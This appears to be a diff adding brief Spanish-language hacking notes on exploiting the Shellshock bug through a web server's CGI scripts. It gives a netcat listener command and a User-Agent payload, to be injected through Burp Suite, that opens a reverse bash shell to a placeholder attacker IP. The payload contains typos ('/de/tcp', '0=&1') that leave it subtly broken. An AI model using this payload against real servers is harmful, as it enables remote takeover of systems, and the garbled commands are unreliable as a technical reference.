@@ -1,0 +1,19 @@
+@@@ 1
+
+    Como atacantes, si provamos por ejemplo poner en un login admin:admin 
+    tenemos que ver en la url si sale algun archivo con extensión "cgi,pl,sh u otros"
+
+@@@ 2
+
+    Como se explota:
+
+        Si la web es bulnerable, a traves de el USER-AGENT podemos meterle una especie de comando o declaracion
+        para que nos actie un comando por ejemplo abrir una shell.
+
+        Para ello nos ponemos en escucha:
+
+            nc -nlvp 443
+
+        * Nos vamos a bursuit y insertamos en el USER-AGENT lo siguiente:
+
+            () { :; }; /bin/bash -i >& /de/tcp/IPatacante/puerto 0=&1
